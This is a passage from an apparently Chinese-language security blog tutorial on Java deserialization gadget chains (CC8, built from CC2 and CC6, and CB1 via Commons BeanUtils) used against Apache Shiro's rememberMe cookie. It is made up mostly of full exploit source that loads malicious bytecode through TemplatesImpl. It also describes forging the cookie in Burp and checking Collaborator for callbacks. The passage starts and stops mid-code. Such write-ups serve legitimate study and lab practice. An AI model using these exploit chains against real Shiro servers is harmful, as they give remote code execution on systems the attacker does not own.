class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;object.ser&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        <span class="comment">//反序列化执行readObject()方法</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span>  ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        fis.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;反序列化完成...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>把生成的序列化字符串文件object.ser，放到cookie加密脚本同目录下，然后运行脚本生成cookie：<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1693999017177-947cd84c-d1f3-4140-aea7-c728638989ad.png" alt="image.png"><br>burp抓包，更换rememberMe字段cookie，打过去，注意要删掉多余的JSESSIONID，这和代码流程有关<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1693999283905-79aaf41a-aa36-42be-b5bf-3c3f06278df4.png" alt="image.png"><br>burp的collaborator模块，狂点Poll now，就能够接收到请求记录<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1693999315175-cf6b5f5c-b38c-4fb4-8454-344710dfc4d4.png" alt="image.png"></p>
<h2 id="CC8"><a href="#CC8" class="headerlink" title="CC8"></a>CC8</h2><p>这个要加Commons Collections3的依赖，因为Shiro本身并不带Commons Collections3，test的不算</p>
<p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1693999853223-2530f8a9-dc3f-4f43-a174-62d3385d77f5.png" alt="image.png"></p>
<p>加了CC3的依赖，按理说应该每条CC3的链子我们都能打通，但是当我们尝试用CC6去打的时候会有以下报错<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694000222650-5772d7a6-6ff2-436a-99c4-26f235c121c7.png" alt="image.png"><br>意思是无法加载Transomer数组这个类，这意味着我们没办法用ChainedTransformer类了，而不用chainedTransformer数组的链子，很容易想到CC2的特点，代码执行+不用数组<br>尝试编写Exp如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestCC8</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// CC2部分</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="comment">//设置变量，确保函数流程走通</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;jasper&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\Codes\\Java\\javasec\\CC\\target\\classes\\pojo\\Calc.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,codes);</span><br><span class="line">        <span class="comment">// _tfactory是，想提前调用链条的时候设置的；反序列化的会自己赋值，可以注释掉</span></span><br><span class="line"><span class="comment">//        setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl());</span></span><br><span class="line">        <span class="comment">//用invokerTransformer触发newTransformer = = </span></span><br><span class="line"><span class="comment">//        templates.newTransformer();</span></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);</span><br><span class="line">        <span class="comment">// invokerTransformer.transform();</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object o)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;object.ser&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        os.writeObject(o);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;序列化完成...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;object.ser&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        <span class="comment">//反序列化执行readObject()方法</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span>  ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        fis.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;反序列化完成...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这样一来就没有用数组，另外把问题转化成调用xxx.transform()了，这里用CC6的后半段就好<br>注意： “key2”改成templates，chainedTransformer改成invokerTransformer<br>完整Exp如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestCC8</span> &#123;</span><br><span class="line">    <span class="comment">// CC2+CC6 实现不使用Transform数组，并且代码执行</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// CC2</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="comment">//设置变量，确保函数流程走通</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;jasper&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\Codes\\Java\\javasec\\CC\\target\\classes\\pojo\\Calc.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,codes);</span><br><span class="line">        <span class="comment">// _tfactory是，想提前调用链条的时候设置的，反序列化的时候可以注释掉，它会在反序列化的时候自己赋值</span></span><br><span class="line"><span class="comment">//        setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl());</span></span><br><span class="line">        <span class="comment">// 用invokerTransformer触发newTransformer</span></span><br><span class="line"><span class="comment">//        templates.newTransformer();</span></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);</span><br><span class="line">        <span class="comment">// invokerTransformer.transform();</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// CC6部分</span></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;key1&quot;</span>,<span class="string">&quot;value1&quot;</span>);</span><br><span class="line">        <span class="comment">//修改链子，避免put的时候自己电脑老执行命令</span></span><br><span class="line">        <span class="type">LazyMap</span> <span class="variable">lazyMap</span> <span class="operator">=</span> (LazyMap) LazyMap.decorate(hashMap,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"><span class="comment">//        lazyMap.get(&quot;Jasper&quot;);</span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, templates);</span><br><span class="line"><span class="comment">//        tiedMapEntry.getValue();</span></span><br><span class="line"><span class="comment">//        tiedMapEntry.hashCode();</span></span><br><span class="line"><span class="comment">//        Class clazz = Class.forName(&quot;java.util.HashMap&quot;);</span></span><br><span class="line"><span class="comment">//        Method hashMethod = clazz.getDeclaredMethod(&quot;hash&quot;, Object.class);</span></span><br><span class="line"><span class="comment">//        hashMethod.setAccessible(true);</span></span><br><span class="line"><span class="comment">//        hashMethod.invoke(clazz,tiedMapEntry);</span></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap1 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap1.put(tiedMapEntry,<span class="string">&quot;Jasper&quot;</span>);</span><br><span class="line">        <span class="comment">//把链子改回来</span></span><br><span class="line">        setFieldValue(lazyMap,<span class="string">&quot;factory&quot;</span>,invokerTransformer);</span><br><span class="line">        <span class="comment">//绕过IF判断，调用Transform</span></span><br><span class="line">        lazyMap.remove(templates);</span><br><span class="line">       serialize(hashMap1);</span><br><span class="line">        <span class="comment">// unserialize();</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object o)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;object.ser&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        os.writeObject(o);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;序列化完成...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;object.ser&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        <span class="comment">//反序列化执行readObject()方法</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span>  ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        fis.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;反序列化完成...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694001180401-312875f7-c0f9-4c4d-a815-04167e5add64.png" alt="image.png"></p>
<h2 id="CB1"><a href="#CB1" class="headerlink" title="CB1"></a>CB1</h2><p>CB1链是完全只需要Shiro自带依赖，就可以打通的链子，用到的模块是Commons BeanUtils<br>这个模块有个PropertyUtils.getProperty()可以根据传参调用对应的getter方法<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38455276/1694001350649-32b68692-39fa-42b4-a4ab-5d663a366625.png#averageHue=%236dab6a&clientId=ue6e9373e-da05-4&from=paste&height=245&id=ub9e27978&originHeight=306&originWidth=1339&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=50083&status=done&style=none&taskId=u79659392-fd70-47aa-a783-9369b62b04f&title=&width=1071.2" alt="image.png"><br>在CC3的TemplatesImpl#newTransformer()里提到，调用newTransformer的还有getOutputProperties这个方法，换言之通过getOutputProperties也可代码执行，尝试编写Exp如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestCB1</span> &#123;</span><br><span class="line">    <span class="comment">// 参考CC3和CC4</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"><span class="comment">//        JavaBean bean = new JavaBean();</span></span><br><span class="line"><span class="comment">//        System.out.println(&quot;name = &quot;+ PropertyUtils.getProperty(bean,&quot;name&quot;));</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;Jasper&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\Codes\\Java\\javasec\\CC\\target\\classes\\pojo\\Calc.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,codes);</span><br><span class="line">        <span class="comment">// _tfactory在反序列化的时候会自己赋值，但是如果想调用触发函数templates.newTrnasformer()看一眼效果，就要设置_tfactory</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"><span class="comment">//        templates.newTransformer();</span></span><br><span class="line">        templates.getOutputProperties();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object o)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;object.ser&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        os.writeObject(o);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;序列化完成...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;object.ser&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        <span class="comment">//反序列化执行readObject()方法</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span>  ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        fis.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;反序列化完成...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694001786024-862a8044-59ae-4816-88db-0edfc788922b.png" alt="image.png"><br>那么又因为PropertyUtils.getProperty()可以调用任意getter方法，尝试一下调用getOutputProperties()</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestCB1</span> &#123;</span><br><span class="line">    <span class="comment">// 参考CC3和CC4</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"><span class="comment">//        JavaBean bean = new JavaBean();</span></span><br><span class="line"><span class="comment">//        System.out.println(&quot;name = &quot;+ PropertyUtils.getProperty(bean,&quot;name&quot;));</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;Jasper&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\Codes\\Java\\javasec\\CC\\target\\classes\\pojo\\Calc.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,codes);</span><br><span class="line">        <span class="comment">// _tfactory在反序列化的时候会自己赋值，但是如果想调用触发函数templates.newTrnasformer()看一眼效果，就要设置_tfactory</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"><span class="comment">//        templates.newTransformer();</span></span><br><span class="line">        templates.getOutputProperties();</span><br><span class="line">       PropertyUtils.getProperty(templates,<span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object o)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;object.ser&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        os.writeObject(o);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;序列化完成...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;object.ser&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        <span class="comment">//反序列化执行readObject()方法</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span>  ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        fis.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;反序列化完成...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694001928851-8156d309-1739-415b-87d5-5b5dcac9c973.png" alt="image.png"><br>接下来，开始找谁调用了getProperty，这里发现了BeanComparator#compare，很符合我们要求<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694002167720-97c47687-39cd-4509-b9d9-600979d5ce47.png" alt="image.png"><br>看到compare就很熟悉，在CC4的priorityQueue这个入口类里，我们用到过compare来触发xxx.transform<br>在CB1链里，我们只需要使用priorityQueue反序列化时，会调用到compare这个特性即可<br><strong>注意：下面的add会提前触发链条，这里选择先add，再通过反射设置属性，保证链子不被破坏。</strong><br>最终Exp如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestCB1</span> &#123;</span><br><span class="line">    <span class="comment">// 参考CC3和CC4</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"><span class="comment">//        JavaBean bean = new JavaBean();</span></span><br><span class="line"><span class="comment">//        System.out.println(&quot;name = &quot;+ PropertyUtils.getProperty(bean,&quot;name&quot;));</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title 